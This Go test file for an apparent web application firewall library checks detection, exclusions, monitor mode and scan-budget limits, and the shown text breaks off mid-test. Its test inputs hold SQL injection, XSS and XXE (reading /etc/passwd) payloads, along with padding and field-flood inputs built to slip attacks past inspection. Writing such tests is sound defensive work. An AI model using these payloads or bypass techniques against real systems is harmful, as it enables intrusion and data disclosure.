package aegolith_test

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/ergasterion-dev/aegolith"
)

func mustNew(t *testing.T, cfg aegolith.Config) *aegolith.Firewall {
	t.Helper()
	fw, err := aegolith.New(cfg)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return fw
}

// get builds a GET request from a target such as "/a?b=c".
func get(target string) *aegolith.Request {
	path, query, _ := strings.Cut(target, "?")
	return &aegolith.Request{Method: "GET", RawPath: path, RawQuery: query, Header: http.Header{}}
}

func withBody(method, target, contentType, body string) *aegolith.Request {
	r := get(target)
	r.Method = method
	r.Header.Set("Content-Type", contentType)
	r.Body = []byte(body)
	return r
}

func postJSON(target, body string) *aegolith.Request {
	return withBody("POST", target, "application/json", body)
}

func find(d aegolith.Decision, id string) (aegolith.Match, bool) {
	for _, m := range d.Matches {
		if m.RuleID == id {
			return m, true
		}
	}
	return aegolith.Match{}, false
}

func ruleIDs(d aegolith.Decision) []string {
	var out []string
	for _, m := range d.Matches {
		out = append(out, m.RuleID+"@"+m.Field)
	}
	return out
}

// mustHave returns the match for rule id on field (any field when empty).
func mustHave(t *testing.T, d aegolith.Decision, id, field string) aegolith.Match {
	t.Helper()
	for _, m := range d.Matches {
		if m.RuleID == id && (field == "" || m.Field == field) {
			return m
		}
	}
	t.Fatalf("missing %s@%s; matches %v", id, field, ruleIDs(d))
	return aegolith.Match{}
}

func mustNotHave(t *testing.T, d aegolith.Decision, id string) {
	t.Helper()
	if _, ok := find(d, id); ok {
		t.Fatalf("unexpected %s; matches %v", id, ruleIDs(d))
	}
}

const sqliSearch = "/api/v1/products/search?q=1%27%20OR%20%271%27%3D%271"

func TestInspectGenericBlocksSQLiInQuery(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	d := fw.Inspect(get(sqliSearch))
	if d.Action != aegolith.ActionBlock || d.Monitored || d.Err != nil {
		t.Fatalf("decision %+v", d)
	}
	m := mustHave(t, d, "AEG-SQLI-001", "query.q")
	if m.Location != aegolith.LocQuery || m.Category != aegolith.CatSQLi || m.Action != aegolith.ActionBlock {
		t.Fatalf("match %+v", m)
	}
}

func TestInspectMonitorMode(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
	d := fw.Inspect(get(sqliSearch))
	if d.Action != aegolith.ActionAllow || !d.Monitored {
		t.Fatalf("decision %+v", d)
	}
	mustHave(t, d, "AEG-SQLI-001", "query.q")
}

func TestInspectCleanRequestAllowed(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	for _, r := range []*aegolith.Request{
		get("/api/v1/products/search?q=milk+%26+bread&page=2"),
		postJSON("/api/v1/cart/items", `{"product_id":"4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b","qty":2,"note":"Gate code 1234 & leave at door"}`),
		withBody("POST", "/api/v1/reviews", "application/x-www-form-urlencoded", "rating=5&text=Great+product%2C+would+buy+again"),
	} {
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		r.Header.Set("Referer", "http://localhost:3000/checkout")
		d := fw.Inspect(r)
		if d.Action != aegolith.ActionAllow || d.Monitored || len(d.Matches) != 0 {
			t.Fatalf("%s %s: %+v", r.Method, r.RawPath, d)
		}
	}
}

func cartRoute() aegolith.Route {
	return aegolith.Route{
		Method: "POST", Path: "/api/v1/cart/items",
		Body: map[string]aegolith.Field{
			"product_id": {Type: aegolith.TypeUUID},
			"qty":        {Type: aegolith.TypeInt},
			"note":       {Type: aegolith.TypeText, MaxLen: 500},
		},
	}
}

func TestInspectTypedFieldSkipsDetectors(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{cartRoute()}})
	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":"1 OR 1=1"}`))
	m := mustHave(t, d, "AEG-SCHEMA-001", "body.qty")
	if m.Action != aegolith.ActionBlock || m.Category != aegolith.CatSchema {
		t.Fatalf("schema match %+v", m)
	}
	mustNotHave(t, d, "AEG-SQLI-001")

	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":"1 OR 1=1"}`)); d.Action != aegolith.ActionBlock {
		t.Fatalf("enforce: %+v", d)
	}
	// A text field is still scanned.
	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"note":"1' OR '1'='1"}`))
	mustHave(t, d, "AEG-SQLI-001", "body.note")
	// A valid typed request passes.
	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"product_id":"4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b","qty":2,"note":"leave at door"}`))
	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
		t.Fatalf("valid typed request: %+v", d)
	}
}

func TestInspectUnknownRouteMonitors(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
	d := fw.Inspect(get("/api/v1/brand-new-endpoint?x=1"))
	if d.Action != aegolith.ActionAllow || !d.Monitored {
		t.Fatalf("decision %+v", d)
	}
	m := mustHave(t, d, "AEG-ROUTE-001", "path")
	if m.Action != aegolith.ActionMonitor || m.Category != aegolith.CatRoute {
		t.Fatalf("route match %+v", m)
	}
	// Attacks on unknown routes are still found (inputs are untyped).
	d = fw.Inspect(get("/api/v1/brand-new-endpoint?q=1%27%20OR%20%271%27%3D%271"))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("attack on unknown route: %+v", d)
	}
	// UnknownRoute block.
	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}, UnknownRoute: aegolith.ActionBlock})
	if d := fw.Inspect(get("/api/v1/brand-new-endpoint")); d.Action != aegolith.ActionBlock {
		t.Fatalf("unknown route block: %+v", d)
	}
	// No routes configured: no route rule at all.
	fw = mustNew(t, aegolith.Config{})
	mustNotHave(t, fw.Inspect(get("/api/v1/brand-new-endpoint")), "AEG-ROUTE-001")
}

func TestInspectExclusion(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Exclusions: []aegolith.Exclusion{
		{Rule: "AEG-SQLI-*", Route: "GET /api/v1/products/search", Field: "query.q"},
	}})
	d := fw.Inspect(get(sqliSearch))
	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
		t.Fatalf("excluded: %+v", d)
	}
	// Another field or route is not excluded.
	if d := fw.Inspect(get("/api/v1/products/search?term=1%27%20OR%20%271%27%3D%271")); d.Action != aegolith.ActionBlock {
		t.Fatalf("other field: %+v", d)
	}
	if d := fw.Inspect(get("/api/v1/products/list?q=1%27%20OR%20%271%27%3D%271")); d.Action != aegolith.ActionBlock {
		t.Fatalf("other route: %+v", d)
	}
}

func TestInspectExclusionByCategoryAndWildcards(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Exclusions: []aegolith.Exclusion{{Rule: "sqli", Route: "*", Field: "query.*"}}})
	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionAllow {
		t.Fatalf("category exclusion: %+v", d)
	}
	fw = mustNew(t, aegolith.Config{Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-001"}}})
	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionAllow {
		t.Fatalf("empty route/field mean any: %+v", d)
	}
}

// Ruling 10: when routes exist but none matched, the exclusion route key is
// METHOD + space + decoded path.
func TestInspectExclusionUnmatchedRouteKey(t *testing.T) {
	fw := mustNew(t, aegolith.Config{
		Routes:     []aegolith.Route{cartRoute()},
		Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-001", Route: "GET /api/v1/legacy search", Field: "query.q"}},
	})
	d := fw.Inspect(get("/api/v1/legacy%20search?q=1%27%20OR%20%271%27%3D%271"))
	if d.Action != aegolith.ActionAllow {
		t.Fatalf("decision %+v", d)
	}
	mustNotHave(t, d, "AEG-SQLI-001")
	// On a matched route the key is the route template.
	fw = mustNew(t, aegolith.Config{
		Routes:     []aegolith.Route{{Method: "GET", Path: "/api/v1/products/:id"}},
		Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-001", Route: "GET /api/v1/products/:id", Field: "query.q"}},
	})
	if d := fw.Inspect(get("/api/v1/products/42?q=1%27%20OR%20%271%27%3D%271")); d.Action != aegolith.ActionAllow {
		t.Fatalf("template key: %+v", d)
	}
}

func TestInspectRuleActionOverride(t *testing.T) {
	scan := get("/api/v1/products")
	scan.Header.Set("User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")
	fw := mustNew(t, aegolith.Config{})
	if d := fw.Inspect(scan); d.Action != aegolith.ActionBlock {
		t.Fatalf("scanner default: %+v", d)
	}
	fw = mustNew(t, aegolith.Config{RuleActions: map[string]aegolith.Action{"scanner": aegolith.ActionMonitor}})
	d := fw.Inspect(scan)
	if d.Action != aegolith.ActionAllow || !d.Monitored {
		t.Fatalf("scanner monitor: %+v", d)
	}
	if m := mustHave(t, d, "AEG-SCANNER-001", "header.user-agent"); m.Action != aegolith.ActionMonitor {
		t.Fatalf("match action %v", m.Action)
	}
	// Exact ID beats prefix beats category; allow drops the match.
	fw = mustNew(t, aegolith.Config{RuleActions: map[string]aegolith.Action{
		"sqli": aegolith.ActionMonitor, "AEG-SQLI-*": aegolith.ActionBlock, "AEG-SQLI-001": aegolith.ActionAllow,
	}})
	d = fw.Inspect(get(sqliSearch))
	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
		t.Fatalf("exact allow: %+v", d)
	}
	fw = mustNew(t, aegolith.Config{RuleActions: map[string]aegolith.Action{"sqli": aegolith.ActionMonitor, "AEG-SQLI-*": aegolith.ActionBlock}})
	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionBlock {
		t.Fatalf("prefix beats category: %+v", d)
	}
	// Unknown route can be made to block through RuleActions too.
	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}, RuleActions: map[string]aegolith.Action{"AEG-ROUTE-001": aegolith.ActionBlock}})
	if d := fw.Inspect(get("/nope")); d.Action != aegolith.ActionBlock {
		t.Fatalf("route override: %+v", d)
	}
}

func hugeJSON(n int) string {
	var b strings.Builder
	b.WriteString("{")
	for i := range n {
		if i > 0 {
			b.WriteString(",")
		}
		fmt.Fprintf(&b, `"k%d":1`, i)
	}
	b.WriteString("}")
	return b.String()
}

// TestInspectHugeBody: 100k JSON fields stop the walk at MaxFields
// (AEG-PROTO-010) and the raw body is scanned under the per-request scan
// budget, so the time stays bounded and the legit-shaped body is allowed.
func TestInspectHugeBody(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	r := postJSON("/api/v1/import", hugeJSON(100000))
	if len(r.Body) <= 1<<20 {
		t.Fatalf("body should exceed the 1 MiB limit, is %d bytes", len(r.Body))
	}
	fw.Inspect(postJSON("/warm", `{"a":1}`)) // first-call setup is not what is measured
	start := time.Now()
	d := fw.Inspect(r)
	el := time.Since(start)
	t.Logf("inspect took %v", el)
	if el > 500*time.Millisecond*raceSlowdown {
		t.Fatalf("took %v", el)
	}
	m := mustHave(t, d, "AEG-PROTO-010", "body")
	if m.Action != aegolith.ActionMonitor || d.Action != aegolith.ActionAllow || !d.Monitored {
		t.Fatalf("decision %+v", d)
	}
	// Deep nesting is a limit hit too, and what follows it is still scanned.
	d = fw.Inspect(postJSON("/x", strings.Repeat("[", 5000)))
	mustHave(t, d, "AEG-PROTO-010", "body")
	d = fw.Inspect(postJSON("/x", `{"a":`+strings.Repeat("[", 40)+`1`+strings.Repeat("]", 40)+`,"q":"1' OR '1'='1"}`))
	mustHave(t, d, "AEG-PROTO-010", "body")
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("attack after a too-deep value: %+v", d)
	}
}

func TestInspectMalformedJSON(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"note":"ok"`))
	if d.Action != aegolith.ActionAllow || !d.Monitored {
		t.Fatalf("plain malformed: %+v", d)
	}
	if m := mustHave(t, d, "AEG-PROTO-020", "body"); m.Action != aegolith.ActionMonitor {
		t.Fatalf("%+v", m)
	}
	// An attack in the unparsable part is found by scanning the raw body.
	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"note":"x", "q": "1' OR '1'='1' --`))
	mustHave(t, d, "AEG-PROTO-020", "body")
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("attack in malformed body: %+v", d)
	}
}

// Ruling 4: the malformed-JSON raw body is scanned in overlapping windows,
// so padding cannot push an attack past the first window.
func TestInspectMalformedJSONRawBodyWindowed(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	body := `{"pad":"` + strings.Repeat("a", 9000) + `", "q": "1' OR '1'='1' --`
	d := fw.Inspect(postJSON("/x", body))
	mustHave(t, d, "AEG-PROTO-020", "body")
	if m := mustHave(t, d, "AEG-PROTO-011", "body.pad"); m.Action != aegolith.ActionMonitor {
		t.Fatalf("%+v", m)
	}
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("decision %+v", d)
	}
	mustHave(t, d, "AEG-SQLI-001", "body")
}

// Rulings 1, 2 and fix-round ruling 4: a value longer than MaxValueLen is
// reported (AEG-PROTO-011, monitor) and scanned in overlapping windows.
func TestInspectLongValuesWindowed(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
	long := strings.Repeat("a", 8192) + "1' OR '1'='1"
	d := fw.Inspect(get("/s?q=" + long))
	mustHave(t, d, "AEG-PROTO-011", "query.q")
	mustHave(t, d, "AEG-SQLI-001", "query.q")

	d = fw.Inspect(postJSON("/s", `{"note":"`+long+`"}`))
	mustHave(t, d, "AEG-PROTO-011", "body.note")
	mustHave(t, d, "AEG-SQLI-001", "body.note")

	// An attack straddling a window edge is inside the overlapping window.
	edge := strings.Repeat("a", 8192-5) + " 1' OR '1'='1 " + strings.Repeat("a", 8192)
	mustHave(t, fw.Inspect(postJSON("/s", `{"note":"`+edge+`"}`)), "AEG-SQLI-001", "body.note")

	// A long clean value is only reported.
	d = fw.Inspect(postJSON("/s", `{"note":"`+strings.Repeat("lorem ipsum ", 3000)+`"}`))
	if len(d.Matches) != 1 || d.Matches[0].RuleID != "AEG-PROTO-011" {
		t.Fatalf("long clean value: %v", ruleIDs(d))
	}

	fw = mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, AllowXML: true})
	d = fw.Inspect(withBody("POST", "/x", "application/xml", "<a>"+strings.Repeat("b", 9000)+"</a>"))
	mustHave(t, d, "AEG-PROTO-011", "body")
}

// Ruling 3 and fix-round ruling 4: pairs beyond MaxFields raise
// AEG-PROTO-010 and are still scanned.
func TestInspectQueryAndFormFieldLimit(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Limits: aegolith.Limits{MaxFields: 10}})
	var q []string
	for i := range 20 {
		q = append(q, fmt.Sprintf("k%d=v", i))
	}
	q = append(q, "z=1%27%20OR%20%271%27%3D%271")
	d := fw.Inspect(get("/s?" + strings.Join(q, "&")))
	mustHave(t, d, "AEG-PROTO-010", "query")
	mustHave(t, d, "AEG-SQLI-001", "query.z")
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("%+v", d)
	}

	d = fw.Inspect(withBody("POST", "/s", "application/x-www-form-urlencoded", strings.Join(q, "&")))
	mustHave(t, d, "AEG-PROTO-010", "form")
	mustHave(t, d, "AEG-SQLI-001", "form.z")

	// Exactly MaxFields pairs (empty segments ignored) is fine.
	d = fw.Inspect(get("/s?" + strings.Join(q[:10], "&") + "&&&"))
	if len(d.Matches) != 0 {
		t.Fatalf("at the limit: %v", ruleIDs(d))
	}

	// Cookies beyond MaxFields are scanned too.
	r := get("/s")
	r.Header.Set("Cookie", strings.Repeat("a=b; ", 20)+"z=<script>alert(1)</script>")
	d = fw.Inspect(r)
	mustHave(t, d, "AEG-PROTO-010", "cookie")
	mustHave(t, d, "AEG-XSS-001", "cookie.z")
}

// Fix-round ruling 4: the reviewer's padding probes block in enforce mode
// with the default limits.
func TestInspectPaddingDoesNotBypassEnforce(t *testing.T) {
	g := mustNew(t, aegolith.Config{})
	d := g.Inspect(get("/s?q=" + strings.Repeat("a", 8192) + "1%27%20OR%20%271%27%3D%271"))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("padded value: %v", ruleIDs(d))
	}
	var q []string
	for i := range 1000 {
		q = append(q, fmt.Sprintf("k%d=v", i))
	}
	d = g.Inspect(get("/s?" + strings.Join(q, "&") + "&z=1%27%20OR%20%271%27%3D%271"))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("1000 fields then sqli: %v", ruleIDs(d))
	}
	mustHave(t, d, "AEG-PROTO-010", "query")
	big := `{"pad":"` + strings.Repeat("a", 1<<20) + `","q":"1' OR '1'='1"}`
	d = g.Inspect(postJSON("/s", big))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf(">1MiB json: %v", ruleIDs(d))
	}
	mustHave(t, d, "AEG-SQLI-001", "body.q")
	xxe := withBody("POST", "/s", "application/xml", `<?xml version="1.0"?><!--`+strings.Repeat("a", 8200)+`--><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`)
	if d := mustNew(t, aegolith.Config{AllowXML: true}).Inspect(xxe); d.Action != aegolith.ActionBlock {
		t.Fatalf("padded xxe: %v", ruleIDs(d))
	}
	// In monitor mode (no early stop) the XXE rule itself is seen in the
	// window past the padding.
	mustHave(t, mustNew(t, aegolith.Config{AllowXML: true, Mode: aegolith.ModeMonitor}).Inspect(xxe), "AEG-XXE-001", "body")
}

// Fix round 2, ruling A: floods of empty or tiny values cannot exhaust the
// scan budget of a request within the configured limits.
func TestInspectTinyValueFloodsBlock(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	d := fw.Inspect(withBody("POST", "/s", "application/x-www-form-urlencoded", strings.Repeat("a=&", 16384)+"q=1'+OR+'1'='1"))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("form flood: %v", ruleIDs(d))
	}
	d = fw.Inspect(get("/s?" + strings.Repeat("a&", 16384) + "q=1%27%20OR%20%271%27%3D%271"))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("query flood: %v", ruleIDs(d))
	}
	r := get("/s")
	r.Header.Set("Cookie", strings.Repeat("a=; ", 16384)+"z=<script>alert(1)</script>")
	if d := fw.Inspect(r); d.Action != aegolith.ActionBlock {
		t.Fatalf("cookie flood: %v", ruleIDs(d))
	}
	mustNotHave(t, d, "AEG-PROTO-011")
}

// Fix round 2, ruling A: 100k tiny non-empty pairs in a body under 1 MiB
// stay bounded in time and a trailing payload still blocks.
func TestInspectTinyPairsBoundedAndBlock(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	fw.Inspect(get("/warm"))
	body := strings.Repeat("a=b&", 100000) + "q=1'+OR+'1'='1"
	if len(body) >= 1<<20 {
		t.Fatalf("body %d bytes", len(body))
	}
	start := time.Now()
	d := fw.Inspect(withBody("POST", "/s", "application/x-www-form-urlencoded", body))
	el := time.Since(start)
	t.Logf("100k pairs: %v", el)
	if el > time.Second*raceSlowdown {
		t.Fatalf("took %v", el)
	}
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("decision %v", ruleIDs(d))
	}
	mustHave(t, d, "AEG-SQLI-001", "form.q")
	mustNotHave(t, d, "AEG-PROTO-011")
}

// Fix round 2, ruling B: JSON past MaxFields is walked field by field, so
// field-scoped exclusions keep applying and a late payload still blocks.
func TestInspectJSONPastMaxFieldsKeepsFields(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Exclusions: []aegolith.Exclusion{{Rule: "xss", Route: "*", Field: "body.posts[].html"}}})
	item := `{"id":%d,"html":"<p onclick=\"track()\">hi</p>"}`
	small := fw.Inspect(postJSON("/cms", `{"posts":[`+fmt.Sprintf(item, 1)+`]}`))
	if small.Action != aegolith.ActionAllow {
		t.Fatalf("1 item: %v", ruleIDs(small))
	}
	var parts []string
	for i := range 400 {
		parts = append(parts, fmt.Sprintf(item, i))
	}
	large := fw.Inspect(postJSON("/cms", `{"posts":[`+strings.Join(parts, ",")+`]}`))
	if large.Action != aegolith.ActionAllow {
		t.Fatalf("400 items: %v", ruleIDs(large))
	}
	mustHave(t, large, "AEG-PROTO-010", "body")
	mustNotHave(t, large, "AEG-XSS-001")

	late := `{"posts":[` + strings.Join(parts, ",") + `],"title":"1' OR '1'='1"}`
	d := fw.Inspect(postJSON("/cms", late))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("late payload: %v", ruleIDs(d))
	}
	mustHave(t, d, "AEG-SQLI-001", "body.title")
}

// Fix round 2, ruling C: containers do not count toward MaxFields.
func TestInspectContainersDoNotCountTowardMaxFields(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Limits: aegolith.Limits{MaxFields: 10}})
	// 5 keys + 5 values = 10 fields, plus 6 containers.
	d := fw.Inspect(postJSON("/s", `{"a":{"b":{"c":[{"d":[1]}]}}}`))
	mustNotHave(t, d, "AEG-PROTO-010")
}

// jsonOf8KValues builds a JSON array of 8,000-byte strings filling about
// size bytes (each value within MaxValueLen, the body within MaxBodyBytes).
func jsonOf8KValues(size int) string {
	v := strings.Repeat("a", 8000)
	var b strings.Builder
	b.WriteString("[")
	for i := 0; b.Len() < size-200; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`"` + v + `"`)
	}
	return b.String()
}

// Fix round 3, ruling A: a body within limits that is walked (1x) and then
// rescanned raw in overlapping windows (2x) cannot exhaust the budget.
func TestInspectRawRescanWithinBudget(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	arr := jsonOf8KValues(1 << 20)
	trailing := arr + `] "1' OR '1'='1"`
	if len(trailing) > 1<<20 {
		t.Fatalf("body %d bytes", len(trailing))
	}
	d := fw.Inspect(postJSON("/s", trailing))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("malformed after 1 MiB of values: %v", ruleIDs(d))
	}
	deep := arr + "," + strings.Repeat("[", 40) + `"1' OR '1'='1"` + strings.Repeat("]", 41)
	d = fw.Inspect(postJSON("/s", deep))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("depth overflow after 1 MiB of values: %v", ruleIDs(d))
	}
	mustHave(t, d, "AEG-SQLI-001", "body")
}

// Fix round 4, ruling A1: a walked value longer than MaxValueLen is scanned
// in overlapping windows (up to 2x) and the raw rescan after a stop costs
// up to 2x again; a body within MaxBodyBytes still cannot exhaust the budget,
// so a payload after the long value is seen.
func TestInspectLongValueRescanWithinBudget(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	const sqli = `"1' OR '1'='1"`
	long := strings.Repeat("a", (1<<20)-200)
	half := strings.Repeat("a", (1<<19)-100)
	for name, body := range map[string]string{
		"trailing data":    `["` + long + `"] ` + sqli,
		"depth overflow":   `["` + long + `",` + strings.Repeat("[", 40) + sqli + strings.Repeat("]", 41),
		"malformed middle": `["` + long + `", x ` + sqli + `]`,
		"two 512K values":  `["` + half + `","` + half + `"] ` + sqli,
	} {
		if len(body) > 1<<20 {
			t.Fatalf("%s: body %d bytes", name, len(body))
		}
		d := fw.Inspect(postJSON("/s", body))
		if d.Action != aegolith.ActionBlock {
			t.Fatalf("%s: %v", name, ruleIDs(d))
		}
		mustHave(t, d, "AEG-SQLI-001", "body")
	}
}

// Fix round 4, ruling N1: under a long (capped) path, containers and keys
// that leave the path bytes unchanged do not copy it, so filler under a
// 17 x 256-byte-key prefix costs about what it costs under a short path.
func TestInspectLongJSONPathFillerBounded(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	fw.Inspect(get("/warm"))
	const sqli = `"1' OR '1'='1"`
	k := strings.Repeat("k", 256)
	open, end := strings.Repeat(`{"`+k+`":`, 17), strings.Repeat("}", 17)
	room := (1 << 20) - len(open) - len(end) - 200
	for name, inner := range map[string]string{
		"[[],...]":      "[" + strings.Repeat("[],", room/3) + sqli + "]",
		"[{a:1},...]":   "[" + strings.Repeat(`{"a":1},`, room/8) + sqli + "]",
		"{a:1,a:1,...}": "{" + strings.Repeat(`"a":1,`, room/6) + `"z":` + sqli + "}",
	} {
		body := open + inner + end
		if len(body) > 1<<20 {
			t.Fatalf("%s: body %d bytes", name, len(body))
		}
		var before, after runtime.MemStats
		runtime.ReadMemStats(&before)
		start := time.Now()
		d := fw.Inspect(postJSON("/s", body))
		el := time.Since(start)
		runtime.ReadMemStats(&after)
		alloc := after.TotalAlloc - before.TotalAlloc
		t.Logf("%s: %v, %d MiB allocated", name, el, alloc>>20)
		if el > 250*time.Millisecond*raceSlowdown {
			t.Fatalf("%s took %v", name, el)
		}
		if alloc > 64<<20 {
			t.Fatalf("%s allocated %d MiB", name, alloc>>20)
		}
		if d.Action != aegolith.ActionBlock {
			t.Fatalf("%s: payload after filler: %v", name, ruleIDs(d))
		}
	}
}

// Fix round 3, ruling A: a long padded body value (scanned ~2x) plus more
// than 64 KiB of query or cookie data does not exhaust the budget.
func TestInspectPaddedBodyPlusOtherInputs(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	pad := strings.Repeat("a", (1<<20)-64)
	form := "p=" + pad[:len(pad)-40] + "+1'+OR+'1'='1"
	var q []string
	for i := range 80 {
		q = append(q, fmt.Sprintf("k%d=%s", i, strings.Repeat("b", 1000)))
	}
	r := withBody("POST", "/s?"+strings.Join(q, "&"), "application/x-www-form-urlencoded", form)
	if d := fw.Inspect(r); d.Action != aegolith.ActionBlock {
		t.Fatalf("80 KB query + padded form: %v", ruleIDs(d))
	}
	r = withBody("POST", "/s", "application/x-www-form-urlencoded", "p="+pad)
	r.Header.Set("Cookie", strings.Join(q, "; ")+"; z=<script>alert(1)</script>")
	d := fw.Inspect(r)
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("padded form + 80 KB cookie: %v", ruleIDs(d))
	}
	mustHave(t, d, "AEG-XSS-001", "cookie.z")
}

// Fix round 3, ruling N1: JSON paths are bounded (256 bytes per key segment,
// 1 KiB in total since round 4), so a huge key over many array items costs no more than
// a short one, and a long key's value is still scanned.
func TestInspectLongJSONKeyBounded(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	fw.Inspect(get("/warm"))
	key := strings.Repeat("k", 256<<10)
	n := 380000
	body := `{"` + key + `":[` + strings.Repeat(`1,`, n) + `"1' OR '1'='1"]}`
	if len(body) > (1<<20)+64 {
		t.Fatalf("body %d bytes", len(body))
	}
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	start := time.Now()
	d := fw.Inspect(postJSON("/s", body))
	el := time.Since(start)
	runtime.ReadMemStats(&after)
	alloc := after.TotalAlloc - before.TotalAlloc
	t.Logf("256 KiB key x %d items: %v, %d MiB allocated", n, el, alloc>>20)
	if el > time.Second*raceSlowdown {
		t.Fatalf("took %v", el)
	}
	if alloc > 256<<20 {
		t.Fatalf("allocated %d MiB", alloc>>20)
	}
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("payload after long-key array: %v", ruleIDs(d))
	}
	d = fw.Inspect(postJSON("/s", `{"`+strings.Repeat("k", 300)+`":"1' OR '1'='1"}`))
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("long key value: %v", ruleIDs(d))
	}
}

// Fix-round rulings 4 and round-4 A1: the per-request scan budget is
// 4 x (MaxBodyBytes + 256 KiB) + 64 KiB, so only inputs beyond the limits
// (here a query string far over 256 KiB) can exhaust it. Exhaustion raises
// AEG-PROTO-011 once as a monitor match and stops scanning: a documented
// known gap, not a block, and never a panic.
func TestInspectScanBudgetExhausted(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Limits: aegolith.Limits{MaxBodyBytes: 64 << 10, MaxValueLen: 1024}})
	// The budget is 1,344 KiB; an 800 KiB value is charged about 1,600 KiB.
	r := get("/s?pad=" + strings.Repeat("a", 800<<10) + "&q=1%27%20OR%20%271%27%3D%271")
	d := fw.Inspect(r)
	if d.Err != nil || d.Action != aegolith.ActionAllow || !d.Monitored {
		t.Fatalf("decision %+v", d)
	}
	if m := mustHave(t, d, "AEG-PROTO-011", "query.pad"); m.Action != aegolith.ActionMonitor {
		t.Fatalf("%+v", m)
	}
	mustNotHave(t, d, "AEG-SQLI-001")
	n := 0
	for _, m := range d.Matches {
		if m.RuleID == "AEG-PROTO-011" {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("PROTO-011 reported %d times: %v", n, ruleIDs(d))
	}
	// The same body-borne padding within the limits does not exhaust it.
	body := `{"pad":"` + strings.Repeat("a", 60<<10) + `","q":"1' OR '1'='1"}`
	if d := fw.Inspect(postJSON("/s", body)); d.Action != aegolith.ActionBlock {
		t.Fatalf("in-limit padded body: %v", ruleIDs(d))
	}
}

// TestInspectScanBudgetBoundsTime: worst-case inputs for the default limits
// (a 2 MiB string value, a 1 MiB query of pairs, a 2 MiB malformed body)
// stay within a fixed time bound because the scan budget caps detector work.
func TestInspectScanBudgetBoundsTime(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
	fw.Inspect(get("/warm"))
	pairs := strings.Repeat("k=a'b&", (1<<20)/6)
	for name, r := range map[string]*aegolith.Request{
		"long value": postJSON("/s", `{"pad":"`+strings.Repeat("a'", 2<<20)+`"}`),
		"many pairs": get("/s?" + pairs),
		"malformed":  postJSON("/s", `{"pad":"`+strings.Repeat("a'", 2<<20)),
		"form pairs": withBody("POST", "/s", "application/x-www-form-urlencoded", pairs+pairs),
	} {
		start := time.Now()
		d := fw.Inspect(r)
		el := time.Since(start)
		t.Logf("%s: %v", name, el)
